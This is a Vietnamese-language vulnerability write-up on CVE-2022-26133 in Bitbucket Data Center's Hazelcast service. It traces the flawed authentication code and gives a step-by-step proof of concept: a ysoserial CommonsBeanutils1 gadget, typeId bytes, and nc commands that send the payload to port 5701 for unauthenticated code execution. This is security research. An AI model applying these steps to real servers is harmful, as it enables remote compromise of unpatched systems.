## CVE-2022-26133 : Bitbucket Data Center - Java Deserialization Vulnerability In Hazelcast 

Advisory: https://jira.atlassian.com/browse/BSERV-13173

## #CVE-2022-26133
Lỗ hổng Java Deserialize xảy ra tại dịch vụ `Hazelcast`, cho phép người dùng không xác thực có thể khai thác trực tiếp và thực thi bất kỳ câu lệnh hệ thống từ xa.

![image](https://github.com/user-attachments/assets/c9b1c928-f195-44ff-89d7-ef44a4842623)

## #Setup môi trường
- Cài đặt `Bitbucket Data Center and Server` trên version 7.6.13 (bản vulnerable được mô tả trên advisory)
![image](https://github.com/user-attachments/assets/381ddc3e-988c-4282-9044-14cf7b1604bc)


- Thiết lập HOME directory bằng cách edit file `/bin/set-bitbucket-home.sh`
```
set BITBUCKET_HOME=/tmp/home
```
- Setup remote debug bằng cách edit file `/bin/_start-webapp.sh`
```
set JVM_SUPPORT_RECOMMENDED_ARGS=-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005
```
- Cấu hình `HazelCast` cluster node bằng cách edit file `${BITBUCKET_HOME}/shared/bitbucket.properties` ( hoặc tạo mới nếu chưa có)
```
# Use multicast to discover cluster nodes (recommended).
hazelcast.network.multicast=true
 
# If your network does not support multicast, you may uncomment the following lines and substitute
# the IP addresses of some or all of your cluster nodes. (Not all of the cluster nodes have to be
# listed here but at least one of them has to be active when a new node joins.)
#hazelcast.network.tcpip=true
#hazelcast.network.tcpip.members=192.168.0.1:5701,192.168.0.2:5701,192.168.0.3:5701
 
# The following should uniquely identify your cluster on the LAN.
hazelcast.group.name=your-bitbucket-cluster
hazelcast.group.password=your-bitbucket-cluster
```
- Run file `/bin/start-bitbucket.sh` để chạy ứng dụng
- Nếu setup đúng thì sẽ có dịch vụ chạy tại port 5701
```bash!
$ sudo netstat -ntlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
...         
tcp6       0      0 :::7990                 :::*                    LISTEN      8804/java           
...        
tcp6       0      0 :::5701                 :::*                    LISTEN      8804/java           
...
```
- Thực hiện kết nối đến dịch vụ `HazelCast` thông qua port mặc định là 5701
![image](https://github.com/user-attachments/assets/91cb8188-5619-48f2-be2b-0808bd1e2bcb)

## #Technical details

Bug nằm ở `com\atlassian\stash\internal\cluster\SharedSecretClusterAuthenticator.java`
![image](https://github.com/user-attachments/assets/a4cabd4b-b441-4ba6-9772-70e1d238f8ab)

Thực hiện trace code, thì ta thấy hàm `runMutualChallengeResponse()` thực hiện gọi trực tiếp hàm `receiveObject()` ở bên trong
![image](https://github.com/user-attachments/assets/958a6d7b-0607-4a4e-9eaf-2e3953044817)

Hàm `authenticate()` sẽ được gọi khi người dùng truy cập đến dịch vụ `Hazelcast` (port mặc định là `5701`) 
![image](https://github.com/user-attachments/assets/320cd832-e5a2-486e-be28-6afaaeef5f9f)

Để reach được đến hàm `receiveObject()` phải pass được điều kiện kiểm tra group name bởi hàm `verifyGroupName()`
![image](https://github.com/user-attachments/assets/9eaab89e-6a4e-47a3-87bc-caf81d0414a1)

Hàm `in.readUTF()` là object của hàm `ParanoidObjectDataInputStream` thực hiện đọc 4 byte đầu của `InputStream` để lấy chiều dài của chuỗi UTF và các giá trị phía sau là nội dung của Group Name
![image](https://github.com/user-attachments/assets/2cdd8d90-fb28-43b3-b397-abdf552c7a21)

Hoặc khi ta kết nối trực tiếp đến service, thì service cũng trả về trực tiếp nội dung của Group Name
![image](https://github.com/user-attachments/assets/d8399995-dd18-4a05-b61a-03f2ecb78767)

Phân tích ta thấy rằng 4 byte đầu `\x00\x00\x00\x06` mô tả độ dài là 6, và chiều dài chuỗi `ubuntu` vừa đúng 6 ký tự. Hàm `in.readObject()` sẽ thực hiện đọc 4 bytes tiếp theo để check `typeId`  chứ không phải là length của object như bước check Group Name
![image](https://github.com/user-attachments/assets/ca0f88c7-8c0c-4b66-97ad-82071101f694)

Sau đó, dựa vào giá trị của 4 byte đó sẽ quyết định sử dụng class nào để `readObject()`, các class này được define trong biến `this.idMap`
![image](https://github.com/user-attachments/assets/02e1efea-4bb8-47c2-a9b0-91eae202db37)

Tập `this.idMap` như sau:
![image](https://github.com/user-attachments/assets/be7e76b6-58d7-4c23-9e9d-6e0ef896ea2b)
cho nên buộc `typeId`  phải là `-100` để sử dụng `JavaSerializer` thực hiện khai thác deserialize attack nên các byte tiếp theo sẽ là `\xff\xff\xff\x9c`. Gadget chain có thể tằm trong đống thư viện sau:
![image](https://github.com/user-attachments/assets/ac0fabeb-4e35-4658-9f62-f1dfb622e467)

## #Exploit steps
- Tạo malicous payload java serialized bằng công cụ `ysoserial` với gadget-chain là `CommonsBeanutils1`
```bash!
docker.exe run ilyaglow/ysoserial CommonsBeanutils1 gnome-calculator > gadget.bin
```

- Kết nối đến dịch vụ `HazelCast` ở port 5701 để lấy tên `groupName`

```bash!
echo "123" | nc 192.168.168.140 5701 > group_name.txt
```
- Tạo file chứa các byte chỉ định `typeId` của class độc hại

```bash!
echo -e -n "\xff\xff\xff\x9c" > middle.txt
```
- Nối các payload vừa tạo lại với nhau để tạo thành mã khai thác hoàn chỉnh

```bash!
cat group_name.txt middle.txt gadget.bin > final_payload.bin
```

- Gửi payload độc hại đến `HazelCast` service

```bash!
nc 192.168.168.140 5701 < final_payload.bin
```

## #PoC
{%youtube YgZ7tj_AmmU %}
